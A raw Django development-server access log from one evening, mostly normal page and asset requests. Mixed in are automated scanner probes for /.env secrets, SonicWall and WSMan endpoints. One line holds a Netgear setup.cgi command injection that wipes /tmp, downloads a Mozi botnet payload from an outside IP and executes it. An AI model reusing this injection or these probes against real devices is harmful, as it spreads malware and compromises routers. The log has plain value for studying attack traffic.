Watching for file changes with StatReloader
Not Found: /favicon.ico
[19/Jul/2023 22:11:16] "GET /favicon.ico HTTP/1.1" 404 6513
[19/Jul/2023 22:23:12] "GET / HTTP/1.1" 200 1515
[19/Jul/2023 22:26:03] "GET / HTTP/1.1" 200 1515
[19/Jul/2023 22:29:31] "GET / HTTP/1.0" 200 1515
Not Found: /.env
[19/Jul/2023 22:33:47] "GET /.env HTTP/1.1" 404 6492
Forbidden (CSRF cookie not set.): /
[19/Jul/2023 22:33:47] "POST / HTTP/1.1" 403 2922
Not Found: /.env
[19/Jul/2023 22:33:48] "GET /.env HTTP/1.1" 404 6492
Forbidden (CSRF cookie not set.): /
[19/Jul/2023 22:33:49] "POST / HTTP/1.1" 403 2922
[19/Jul/2023 22:38:12] "GET / HTTP/1.1" 200 1515
Not Found: /wsman
[19/Jul/2023 22:38:12] "POST /wsman HTTP/1.1" 404 6499
[19/Jul/2023 22:38:13] "GET / HTTP/1.1" 200 1515
Not Found: /auth.html
[19/Jul/2023 22:38:13] "GET /auth.html HTTP/1.1" 404 6510
Not Found: /auth1.html
Not Found: /sslvpnLogin.html
[19/Jul/2023 22:38:13] "GET /sslvpnLogin.html HTTP/1.1" 404 6531
[19/Jul/2023 22:38:13] "GET /auth1.html HTTP/1.1" 404 6513
Not Found: /api/sonicos/auth
[19/Jul/2023 22:38:13] "GET /api/sonicos/auth HTTP/1.1" 404 6531
Not Found: /api/sonicos/tfa
[19/Jul/2023 22:38:13] "GET /api/sonicos/tfa HTTP/1.1" 404 6528
[19/Jul/2023 22:39:57] "GET / HTTP/1.1" 200 1515
Not Found: /favicon.ico
[19/Jul/2023 22:39:57] "GET /favicon.ico HTTP/1.1" 404 6513
[19/Jul/2023 22:39:57] "GET /staticfiles/images/logo_NTTCS_CF.jpg HTTP/1.1" 200 20664
[19/Jul/2023 22:40:50] "GET / HTTP/1.0" 200 1515
[19/Jul/2023 22:40:54] "OPTIONS / HTTP/1.0" 200 0
[19/Jul/2023 22:41:00] "GET / HTTP/1.0" 200 1515
Not Found: /favicon.ico
[19/Jul/2023 22:41:04] "GET /favicon.ico HTTP/1.1" 404 6513
Not Found: /payment/index.php
[19/Jul/2023 22:41:39] "GET /payment/index.php HTTP/1.1" 404 6529
[19/Jul/2023 22:41:39] "GET / HTTP/1.1" 200 1515
Not Found: /setup.cgi
[19/Jul/2023 23:06:22] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.182.148.46:53736/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 6671
[19/Jul/2023 23:23:35] "GET / HTTP/1.1" 200 1515
[19/Jul/2023 23:34:52] "GET / HTTP/1.1" 200 1515
[19/Jul/2023 23:34:52] "GET /staticfiles/css/botones.css HTTP/1.1" 200 842
[19/Jul/2023 23:34:52] "GET /staticfiles/css/estilos.css HTTP/1.1" 200 5547
[19/Jul/2023 23:34:52] "GET /staticfiles/css/main.css HTTP/1.1" 200 11099
[19/Jul/2023 23:34:52] "GET /staticfiles/images/logo_NTTCS_CF.jpg HTTP/1.1" 200 20664
[19/Jul/2023 23:36:50] "GET / HTTP/1.1" 200 1515
[19/Jul/2023 23:53:21] "GET / HTTP/1.1" 200 1515
Not Found: /favicon.ico
[19/Jul/2023 23:55:26] "GET /favicon.ico HTTP/1.1" 404 6506
[19/Jul/2023 23:55:27] "GET / HTTP/1.1" 200 1515
